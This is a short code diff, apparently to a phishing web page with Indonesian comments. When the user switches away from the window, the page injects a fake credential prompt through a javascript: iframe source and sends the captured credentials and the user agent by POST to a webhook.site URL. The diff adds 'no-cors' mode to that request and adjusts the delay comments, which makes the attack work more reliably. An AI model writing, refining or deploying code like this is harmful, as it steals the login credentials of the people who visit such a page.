@@ -34,7 +34,7 @@
         let credentials = null;
         
         window.onblur = function() {
-            // Tambah jeda 0.5 detik sebelum inject prompt
+            // Tambah jeda 1 detik sebelum inject prompt
             setTimeout(function() {
                 // Inject sophisticated phishing prompt
                 document.getElementById("iframe").src = "javascript:" +
@@ -48,10 +48,11 @@
                     "if(result) {" +
                     "  fetch('https://webhook.site/1bf96978-c901-418e-915d-289876e3fc55', {" +
                     "    method: 'POST'," +
+                    "    mode: 'no-cors'," +
                     "    body: JSON.stringify({creds: result, ua: navigator.userAgent})" +
                     "  });" +
                     "}";
-            }, 1000); // Jeda 0.5 detik (500ms)
+            }, 1000); // Jeda 1 detik (1000ms)
         }
     </script>
 </head>
